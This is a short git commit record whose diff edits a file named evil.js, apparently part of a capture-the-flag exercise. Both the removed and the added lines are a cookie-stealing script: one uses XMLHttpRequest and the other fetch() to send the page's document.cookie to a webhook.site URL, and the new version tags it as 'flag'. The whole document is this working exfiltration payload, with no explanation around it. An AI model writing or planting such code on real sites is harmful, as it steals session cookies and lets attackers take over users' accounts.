c7fc2b8f64e56e24974eeb1d2905e81f8c8aea4d
Jae Young Chung <wayne961025@gmail.com>
2023-02-28 21:16:20 -0500

    fix code

--- evil.js
+++ evil.js
@@ -1,3 +1,1 @@
-var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'https://webhook.site/c4a25932-bf13-4401-a957-0430632abed3?' + document.cookie, true);
-xhttp.send();
+fetch('https://webhook.site/c4a25932-bf13-4401-a957-0430632abed3?flag='+document.cookie);
